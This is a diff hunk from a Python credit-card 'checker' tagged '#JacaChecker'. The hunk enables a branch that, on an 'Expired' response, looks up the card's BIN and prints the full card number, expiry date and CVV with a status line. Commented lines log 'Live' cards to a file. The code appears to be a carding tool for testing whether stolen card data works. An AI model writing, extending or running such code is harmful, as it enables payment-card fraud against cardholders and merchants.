@@ -683,13 +683,14 @@ def checker(card, month, year, cvv):
                     # #pen("everettweb.txt", "a").write(f"Live: {card} {month} {year} {cvv} {bin} Retry 19 [{MSegundos}] #JacaChecker\n") 
                     # print(Fore.GREEN + f"{x} #JacaChecker") 
                     return {"code": saldousdo["codee"], "mensagem": saldousdo["mensageme"]}
-                # elif 'Expired' in response.text:
-                #     saldousdo = Saldo(card, month, year, cvv)
-                #     # bin = api_bin(card[:6])              
-                #     # x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: Retry 19"                    
-                #     # #pen("everettweb.txt", "a").write(f"Live: {card} {month} {year} {cvv} {bin} Retry 19 [{MSegundos}] #JacaChecker\n") 
-                #     # print(Fore.GREEN + f"{x} #JacaChecker") 
-                #     return {"code": saldousdo["codee"], "mensagem": saldousdo["mensageme"]}
+                    
+                elif 'Expired' in response.text:
+                    #saldousdo = Saldo(card, month, year, cvv)
+                    bin = api_bin(card[:6])              
+                    x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: Expired"                    
+                    #pen("everettweb.txt", "a").write(f"Live: {card} {month} {year} {cvv} {bin} Retry 19 [{MSegundos}] #JacaChecker\n") 
+                    print(Fore.GREEN + f"{x} #JacaChecker") 
+                    return {"code": 0, "mensagem": f"{x} #JacaChecker<br>"}
                         
                 elif 'error' in response.text:  
                     msg = pegarItem(response.text, 'reason: ','<')
